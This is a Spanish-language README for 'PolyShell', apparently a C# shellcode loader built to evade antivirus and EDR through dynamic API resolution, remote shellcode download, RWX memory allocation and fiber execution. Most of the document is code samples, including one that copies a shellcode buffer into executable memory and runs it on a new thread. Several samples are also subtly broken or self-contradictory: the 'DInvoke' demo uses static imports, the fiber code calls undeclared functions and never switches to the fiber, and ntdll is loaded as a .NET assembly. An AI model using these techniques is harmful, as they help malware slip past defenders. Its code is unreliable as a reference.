# PolyShell: Ejecución de Shellcode Polimórfico

PolyShell es una técnica avanzada de ejecución de shellcode que utiliza el polimorfismo para evadir la detección de las soluciones de seguridad. Esta técnica aprovecha diversas estrategias, como DInvoke (Dynamic Invocation), descarga de shellcode desde Internet, asignación de memoria no convencional y ejecución de código desde hilos de fibra, para eludir las defensas tradicionales y ejecutar código malicioso de manera sigilosa.

## Características Principales:

- **DInvoke (Dynamic Invocation):** PolyShell utiliza DInvoke para invocar funciones de la API de Windows de manera dinámica.
  
- **Descarga de Shellcode desde Internet:** PolyShell descarga el shellcode de un servidor remoto, dificultando su detección durante el análisis estático.
  
- **Asignación de Memoria No Convencional:** PolyShell utiliza llamadas al sistema menos comunes para asignar memoria en el proceso, evitando las técnicas de detección convencionales.
  
- **Ejecución de Código desde Hilos de Fibra:** PolyShell ejecuta el shellcode en hilos de fibra para camuflar su ejecución y evitar la detección.

## Uso:

Para utilizar PolyShell, sigue estos pasos:

1. **Descargar el Repositorio:** Clona este repositorio en tu máquina local.

2. **Compilar el Código:** Abre el proyecto en tu IDE preferido y compila el código fuente de PolyShell.

3. **Ejecutar el Binario:** Ejecuta el binario compilado en una máquina de prueba o en un entorno controlado.

4. **Observa el Comportamiento:** Observa cómo PolyShell evade las defensas de seguridad y ejecuta el shellcode de manera sigilosa.


# Técnica DInvoke (Dynamic Invocation)

La técnica DInvoke (Dynamic Invocation) es una estrategia utilizada en el desarrollo de malware y herramientas de hacking para invocar funciones de la API de Windows de manera dinámica en tiempo de ejecución. Esto permite evadir la detección estática y el análisis de malware, ya que las funciones API se resuelven en tiempo de ejecución en lugar de estar enlazadas estáticamente durante la compilación.

## Uso de DInvoke

La técnica DInvoke se basa en la resolución dinámica de funciones de la API de Windows utilizando llamadas a la biblioteca dinámica `kernel32.dll`. A continuación se muestra un ejemplo de cómo utilizar DInvoke para invocar la función `MessageBoxA` de la API de Windows:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    // Declaración de la función MessageBoxA de la API de Windows
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

    static void Main()
    {
        // Resolución dinámica de la función MessageBoxA utilizando DInvoke
        IntPtr user32Module = LoadLibrary("user32.dll");
        IntPtr messageBoxAddress = GetProcAddress(user32Module, "MessageBoxA");

        // Delegado para la función MessageBoxA
        MessageBoxDelegate messageBox = (MessageBoxDelegate)Marshal.GetDelegateForFunctionPointer(messageBoxAddress, typeof(MessageBoxDelegate));

        // Llamada dinámica a la función MessageBoxA
        messageBox(IntPtr.Zero, "Hello, World!", "Message", 0);
    }

    // Declaración de un delegado para la función MessageBoxA
    delegate int MessageBoxDelegate(IntPtr hWnd, string text, string caption, uint type);

    // Declaración de funciones para la resolución dinámica de la función MessageBoxA
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string dllName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
}
   

# Técnica Fiber Shellcode

Fiber Shellcode es una técnica utilizada en el desarrollo de malware y herramientas de hacking para ejecutar código malicioso en un hilo de fibra en lugar de un hilo tradicional en un proceso de Windows. Esta técnica se utiliza para evadir la detección de seguridad y camuflar la ejecución del shellcode.

## Ejemplo de Código

A continuación se muestra un ejemplo simplificado de cómo se implementa la técnica de Fiber Shellcode en C#:

```csharp
using System;
using System.Runtime.InteropServices;
using System.Threading;

class Program
{
    // Función para ejecutar shellcode en un hilo de fibra
    static void FiberShellcode()
    {
        // Código para descargar y ejecutar el shellcode...
    }

    // Declaraciones de las funciones nativas necesarias
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateFiber(uint dwStackSize, ThreadStart lpStartAddress, IntPtr lpParameter);

    [DllImport("kernel32.dll")]
    public static extern void ConvertFiberToThread();

    static void Main(string[] args)
    {
        // Convertir el hilo actual en un hilo de fibra
        IntPtr lpFiber = ConvertThreadToFiber(IntPtr.Zero);

        // Crear un nuevo hilo de fibra y ejecutar el shellcode
        IntPtr fiber = CreateFiber(0, new ThreadStart(FiberShellcode), IntPtr.Zero);

        // Restaurar el contexto original del hilo
        ConvertFiberToThread();
    }
}

# Técnica de Asignación de Memoria No Convencional

La técnica de Asignación de Memoria No Convencional es una estrategia utilizada en el desarrollo de malware y herramientas de hacking para alojar y ejecutar código malicioso en regiones de memoria inusuales o no convencionales en un proceso de Windows. Esta técnica se utiliza para evadir la detección de seguridad y dificultar el análisis forense.

## Ejemplo de Código

A continuación se muestra un ejemplo simplificado de cómo se implementa la técnica de Asignación de Memoria No Convencional en C#:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    // Declaración de la función intermedia para invocar NtAllocateVirtualMemory
    public delegate IntPtr NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);

    // Función intermedia para invocar NtAllocateVirtualMemory
    static IntPtr InvokeNtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, uint AllocationType, uint Protect)
    {
        var ntdll = System.Reflection.Assembly.Load("ntdll");
        var ntAllocateVirtualMemory = ntdll.GetType("NTDLL.NativeMethods").GetMethod("NtAllocateVirtualMemory");
        return (IntPtr)ntAllocateVirtualMemory.Invoke(null, new object[] { ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect });
    }

    // Función para ejecutar shellcode en un proceso de destino utilizando Asignación de Memoria No Convencional
    static void ExecuteShellcode()
    {
        // Shellcode a ejecutar
        byte[] shellcode = { /* Shellcode aquí */ };

        // Invocar la función intermedia para realizar la asignación de memoria no convencional
        IntPtr processHandle = GetCurrentProcess();
        IntPtr baseAddress = IntPtr.Zero;
        UIntPtr regionSize = new UIntPtr((uint)shellcode.Length);
        IntPtr result = InvokeNtAllocateVirtualMemory(processHandle, ref baseAddress, IntPtr.Zero, ref regionSize, 0x3000, 0x40);
        if (result != IntPtr.Zero)
        {
            Console.WriteLine($"Error al asignar memoria no convencional: 0x{result.ToInt32():X}");
            return;
        }

        // Copiar el shellcode a la memoria asignada
        Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

        // Ejecutar el shellcode desde la memoria asignada
        IntPtr threadHandle = IntPtr.Zero;
        IntPtr threadId = IntPtr.Zero;
        threadHandle = CreateThread(IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, ref threadId);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
    }

    // Declaraciones de las funciones nativas necesarias
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static void Main(string[] args)
    {
        // Ejecutar el shellcode en un proceso de destino
        ExecuteShellcode();
    }
}


Descargo de Responsabilidad:
Descargo de Responsabilidad: PolyShell es una herramienta de investigación diseñada para demostrar técnicas avanzadas de evasión de seguridad. El uso de PolyShell con fines maliciosos está estrictamente prohibido. Los autores y los contribuyentes no se hacen responsables del uso indebido de esta herramienta.


